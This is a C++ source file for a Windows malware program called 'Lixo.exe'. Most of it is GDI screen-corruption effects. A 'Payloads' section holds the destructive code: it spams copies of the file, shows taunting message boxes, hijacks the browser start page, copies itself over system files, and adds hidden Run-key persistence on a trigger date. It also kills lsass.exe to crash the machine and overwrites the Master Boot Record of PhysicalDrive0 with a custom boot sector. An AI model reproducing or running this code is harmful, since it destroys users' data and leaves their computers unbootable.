typedef struct IUnknown IUnknown;

#pragma once

#include "Lixo.h"

//Define some global variables to use it later
HDC dc = GetDC(NULL);
HDC dcCopy = CreateCompatibleDC(dc);
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

namespace GDIPayloads
{
	DWORD WINAPI GDIPayload1(LPVOID lpvd)
	{
		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);

			Sleep(rand() % 25);

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload2(LPVOID lpvd)
	{

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			SetStretchBltMode(dcCopy, COLORONCOLOR);
		    	SetStretchBltMode(dc, COLORONCOLOR);

			StretchBlt(dcCopy, 0, 0, w / 3, h / 3, dc, 0, 0, w, h, SRCCOPY);
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / 3, h / 3, SRCCOPY);

			if (rand() % 5 == 4) StretchBlt(dc, 1, 1, w, h, dc, 0, 0, w, h, SRCAND);
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload3(LPVOID lpvd)
	{
		while (1)
		{
			for (int i = 0; i < 25; i++)
			{
				DrawIcon(dc, rand() % w, rand() % h, LoadIcon(0, IDI_ERROR));
				Sleep(50);

				if (i == 24) System::RedrawScreen();
			}
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload4(LPVOID lpvd)
	{
		while (1)
		{
			for (int x = 0; x <= w; x++)
			{ 
				for (int y = 0; y <= h; y++)
				{
					int fx = x ^ y;
					COLORREF color = RGB(fx, fx, fx);
					HBRUSH brush = CreateSolidBrush(color);
					SelectObject(dc, brush);

					PatBlt(dc, 0, 0, w, h, PATINVERT);
					Sleep(rand() % 50);
				}
			}
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload5(LPVOID lpvd)
	{
		//I did this with Rekto, if in the future I optimize this code, I will change it later.
		BITMAPINFO bmpi = { 0 };
		BLENDFUNCTION blur;
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		bmp = CreateDIBSection(dc, &bmpi, 0, 0, NULL, 0);
		SelectObject(dcCopy, bmp);

		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 10;

		loop:
			BitBlt(dcCopy, rand() % 10, rand() % 12, w, h, dc, rand() % -10, rand() % -12, SRCCOPY);
			AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
			Sleep(rand() % 25);
		goto loop;

		return 0x00;
	}

	DWORD WINAPI GDIPayload6(LPVOID lpvd)
	{	
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		//Counter variable
		INT i = 0;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					FLOAT fx = (x + i) ^ (y + i);

					rgbquadCopy = rgbquad[index];

					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

					rgbquad[index] = Colors::hsl2rgb(hslcolor);
				}
			}

			i++;
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload7(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;
					int j = 4 * i;

					//Old-School Plasma effect
					int fx = (int)(j + (j * sin(x / 16.0)) + j + (j * sin(y / 8.0)) + j + (j * sin((x + y) / 16.0)) + j + (j * sin(sqrt((double)(x * x + y * y)) / 8.0))) / 4;

					rgbquadCopy = rgbquad[index];

					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

					rgbquad[index] = Colors::hsl2rgb(hslcolor);
				}
			}

			i++;
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload8(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		while (1)
		{
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					double fractalX = (2.5f / w);
					double fractalY = (1.90f / h);

					double cx = x * fractalX - 2.f;
					double cy = y * fractalY - 0.95f;

					double zx = 0;
					double zy = 0;

					int fx = 0;

					while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
					{
						double fczx = zx * zx - zy * zy + cx;
						double fczy = 2 * zx * zy + cy;

						zx = fczx;
						zy = fczy;
						fx++;

						rgbquad[index].rgbRed += fx;
						rgbquad[index].rgbGreen += fx;
						rgbquad[index].rgbBlue += fx;
					}
				}
			}

			i++;
			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload9(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		float i = 0;

		while (1)
		{
			int j = 1 + rand() % 16;

			SetStretchBltMode(dcCopy, COLORONCOLOR);
			SetStretchBltMode(dc, COLORONCOLOR);

			StretchBlt(dcCopy, 0, 0, w / j, h / j, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;
			float fx;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;
					
					if ((int)i % 3) fx = x + y * i;
					if ((int)i % 2) fx = i * x + y;
					else fx = i * x * x + y * y * i;

					rgbquadCopy = rgbquad[index];

					hslcolor = Colors::rgb2hsl(rgbquadCopy);
					hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

					rgbquad[index] = Colors::hsl2rgb(hslcolor);

					if (i == 1) i = (int)i & 1;
				}
			}

			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / j, h / j, SRCCOPY);

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload10(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(dcCopy, hBrush);
			SelectObject(dc, hBrush);

			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, SRCCOPY | PATINVERT);

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					rgbquad[index].rgbRed += 1;
					rgbquad[index].rgbGreen += 1;
					rgbquad[index].rgbBlue += 1;
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY | PATINVERT);

			Sleep(rand() % 100); //50
			System::RedrawScreen();
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload11(LPVOID lpvd)
	{
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 100;
		INT j = 4;

		while (1)
		{
			SetStretchBltMode(dc, COLORONCOLOR);
			SetStretchBltMode(dcCopy, COLORONCOLOR);

			StretchBlt(dcCopy, rand() % 3, rand() % 3, w / j, h / j, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);

			INT k = rand() % 15;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					if (k < 5)
					{
						rgbquad[index].rgbRed += rand() % (i + 1);
						rgbquad[index].rgbGreen += 0;
						rgbquad[index].rgbBlue += 0;
					}

					if (k >= 5 && k <= 10)
					{
						rgbquad[index].rgbRed += 0;
						rgbquad[index].rgbGreen += rand() % (i + 1);
						rgbquad[index].rgbBlue += 0;
					}

					if (k > 10 && k <= 15)
					{
						rgbquad[index].rgbRed += 0;
						rgbquad[index].rgbGreen += 0;
						rgbquad[index].rgbBlue += rand() % (i + 1);
					}
				}
			}	
			
			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w / j, h / j, SRCCOPY);

			Sleep(rand() % 50);
			System::RedrawScreen();

			if (rand() % 25 == 24)
			{
				StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
				StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
				StretchBlt(dc, 50, 50, w - 100, h - 100, dc, 0, 0, w, h, SRCCOPY);
			}
		}

		return 0x00;
	}

	DWORD WINAPI GDIPayload12(LPVOID lpvd)
	{
		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			int fx = rand() % h;

			if (rand() % 3 == 2)
			{
				StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
				StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
			}

			if (rand() % 3 == 2)
			{
				if (rand() % 25 == 24) BitBlt(dc, 10, 0, w, h, dc, 0, 10, SRCPAINT);
				if (rand() % 25 == 24) BitBlt(dc, -10, 0, w, h, dc, 0, -10, SRCAND);
				if (rand() % 25 == 24) BitBlt(dc, -10, -10, w, h, dc, 0, 0, SRCPAINT);
				if (rand() % 25 == 24) BitBlt(dc, 10, 10, w, h, dc, 0, 0, SRCAND);
			}

			BitBlt(dc, -10, fx, w, -10, dc, 0, fx, SRCCOPY);
			BitBlt(dc, 10, fx, w, 10, dc, 0, fx, SRCCOPY);

			if (rand() % 25 == 24) System::RedrawScreen();
		}

		return 0x00;
	}
}

namespace Payloads
{
	//Create 512 random files on Desktop
	VOID SpamFiles(VOID)
	{
		for (int i = 0; i < 512; i++)
		{
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"" + i);
		}
	}

	DWORD WINAPI Message(LPVOID lpvd)
	{
		LPCWSTR string = L"This is just the beginning my friend!";

		while (1)
		{
			int fx = rand() % 7;

			MessageBoxW(NULL, string, L"Lixo.exe - ur fucked up.", MB_OK | MB_ICONINFORMATION);

			//Some cool randomic strings
			if (fx == 0) string = L"Pneumonoultramicroscopicosilicovolcanoconiosis";
			if (fx == 1) string = L"All I do is work, work, work, I quit!";
			if (fx == 2) string = L"Whoever read this is gay!";
			if (fx == 3) string = L"Hold on tight, buddy!";	
			if (fx == 4) string = L"THE END IS NEAR!!!";
			if (fx == 5) string = L"Veni, Vidi, Vici!";
			if (fx == 6) string = L"DEAD END.";
		}
		return 0x00;
	}

	VOID SpecialPayload(VOID)
	{
		//Change IE Start page
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Internet Explorer\\Main", L"Start Page", REG_SZ, (LPBYTE)L"https://www.youtube.com/@JhoPro", 16);

		//Copy file to critical system's locals
		System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\System32\\Scanner.exe");
		System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\calc.exe");

		//If is September 30th:
		if (System::CheckDate(0) == 30 && System::CheckDate(1) == 8)
		{
			System::SetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"WinNet", REG_SZ, (LPBYTE)L"C:\\Windows\\WinNet.exe", 16);
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\WinNet.exe");
			System::HideFile(L"C:\\Windows\\WinNet.exe");

			MessageBoxW(NULL, L"Today is a special day, so I'm sparing you!\n\nSee you later.", L"Lixo.exe - Information", MB_OK | MB_ICONINFORMATION);
			exit(0);
		}
	}

	//The most efficient method of crashing system
	//Screw off NTAPI and TerminateProcess!
	VOID CrashLSASS(VOID)
	{
		system("taskkill /f /im lsass.exe");
		System::RedrawScreen();
	}

	//This overwriter was made by SleepMod, credits to him/her!
	//OBS: I made the full MBR
	VOID OverwriteMBR(VOID)
	{
		const unsigned char MBR[] =
		{
			0xE8, 0x03, 0x00, 0xE8, 0x22, 0x00, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0x68, 0x00, 0xA0, 0x07,
			0xB4, 0x0C, 0x30, 0xC0, 0x31, 0xDB, 0x31, 0xC9, 0xBA, 0x08, 0x00, 0xE8, 0x7B, 0x01, 0xC3, 0x31,
			0xC9, 0xBA, 0x08, 0x00, 0xFF, 0x06, 0xE6, 0x7D, 0x89, 0x0E, 0xE8, 0x7D, 0x89, 0x16, 0xEA, 0x7D,
			0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x08, 0x0F, 0x87, 0x2E, 0x01, 0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x07,
			0x0F, 0x87, 0xF0, 0x00, 0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x06, 0x0F, 0x87, 0xD7, 0x00, 0x81, 0x3E,
			0xE6, 0x7D, 0x00, 0x05, 0x0F, 0x87, 0xB5, 0x00, 0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x04, 0x0F, 0x87,
			0x9E, 0x00, 0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x03, 0x0F, 0x87, 0x83, 0x00, 0x81, 0x3E, 0xE6, 0x7D,
			0x00, 0x02, 0x77, 0x67, 0x81, 0x3E, 0xE6, 0x7D, 0x00, 0x01, 0x77, 0x4F, 0x83, 0x3E, 0xE6, 0x7D,
			0x1E, 0x77, 0x32, 0x72, 0x14, 0x81, 0xF9, 0x40, 0x01, 0x0F, 0x83, 0x06, 0x01, 0x81, 0xFA, 0xC8,
			0x00, 0x73, 0x8C, 0xCD, 0x10, 0x41, 0xEB, 0x90, 0xC3, 0xDB, 0x06, 0xE8, 0x7D, 0xD9, 0xFE, 0xD9,
			0x1E, 0xE8, 0x7D, 0xA0, 0xE8, 0x7D, 0x02, 0x06, 0xE6, 0x7D, 0x02, 0x06, 0xE6, 0x7D, 0x02, 0x06,
			0xE6, 0x7D, 0xE9, 0xCB, 0x00, 0x89, 0xCD, 0x03, 0x2E, 0xE6, 0x7D, 0x89, 0xEB, 0x02, 0x1E, 0xE6,
			0x7D, 0xC0, 0xEB, 0x02, 0x88, 0xD8, 0xD0, 0xE8, 0xE9, 0xA2, 0x00, 0x89, 0xCB, 0x31, 0xD3, 0x02,
			0x1E, 0xE6, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xE9, 0x92, 0x00, 0x50, 0x01, 0xCB, 0x89, 0xC8,
			0x31, 0xD0, 0x31, 0xC8, 0x28, 0xC3, 0x58, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xE9, 0x91, 0x00, 0x50,
			0x01, 0xCB, 0x89, 0xC8, 0x31, 0xD0, 0x28, 0xC3, 0x58, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x6D,
			0x01, 0xCB, 0x02, 0x1E, 0xE6, 0x7D, 0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEB, 0x60, 0xDF, 0x06, 0xE8,
			0x7D, 0xD8, 0x0E, 0xEA, 0x7D, 0xD9, 0x1E, 0xE8, 0x7D, 0xA0, 0xE8, 0x7D, 0x02, 0x06, 0xE6, 0x7D,
			0xC0, 0xE8, 0x02, 0xEB, 0x48, 0x89, 0xCB, 0x21, 0xD3, 0x02, 0x1E, 0xE6, 0x7D, 0x88, 0xD8, 0xC0,
			0xE8, 0x02, 0xEB, 0x39, 0x89, 0x0E, 0xEC, 0x7D, 0x89, 0x16, 0xF0, 0x7D, 0xDB, 0x06, 0xEC, 0x7D,
			0xD8, 0x0E, 0xEC, 0x7D, 0xD9, 0x1E, 0xF4, 0x7D, 0xDB, 0x06, 0xF0, 0x7D, 0xD8, 0x0E, 0xF0, 0x7D,
			0xD9, 0x1E, 0xF8, 0x7D, 0x8B, 0x1E, 0xF4, 0x7D, 0x01, 0x1E, 0xF8, 0x7D, 0xA0, 0xF8, 0x7D, 0xC0,
			0xE8, 0x03, 0x2A, 0x06, 0xE6, 0x7D, 0xEB, 0x05, 0xB8, 0x03, 0x00, 0xCD, 0x19, 0x3C, 0x37, 0x77,
			0x07, 0x3C, 0x20, 0x72, 0x07, 0xE9, 0x0D, 0xFF, 0x2C, 0x10, 0xEB, 0xF1, 0x04, 0x20, 0xEB, 0xED,
			0x3C, 0x1F, 0x77, 0x07, 0x3C, 0x10, 0x72, 0x07, 0xE9, 0xFA, 0xFE, 0x2C, 0x10, 0xEB, 0xF1, 0x04,
			0x20, 0xEB, 0xED, 0x31, 0xC9, 0x42, 0xE9, 0x8F, 0xFE, 0x50, 0x53, 0x89, 0xC8, 0x8E, 0xD8, 0xB4,
			0x0E, 0xBE, 0xBD, 0x7D, 0x8A, 0x04, 0xB7, 0x00, 0xB3, 0x20, 0xFE, 0xC3, 0x80, 0xFB, 0x37, 0x74,
			0xF7, 0xCD, 0x10, 0x46, 0x8A, 0x04, 0x3C, 0x00, 0x75, 0xF0, 0x5B, 0x58, 0xC3, 0x49, 0x54, 0x20,
			0x4C, 0x4F, 0x4F, 0x4B, 0x53, 0x20, 0x4C, 0x49, 0x4B, 0x45, 0x20, 0x59, 0x4F, 0x55, 0x27, 0x52,
			0x45, 0x20, 0x48, 0x41, 0x56, 0x49, 0x4E, 0x47, 0x20, 0x41, 0x20, 0x42, 0x41, 0x44, 0x20, 0x44,
			0x52, 0x45, 0x41, 0x4D, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
		};

		DWORD dwBytesWritten;

		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		WriteFile(hDrive, MBR, 512, &dwBytesWritten, NULL);
		CloseHandle(hDrive);
	}
}
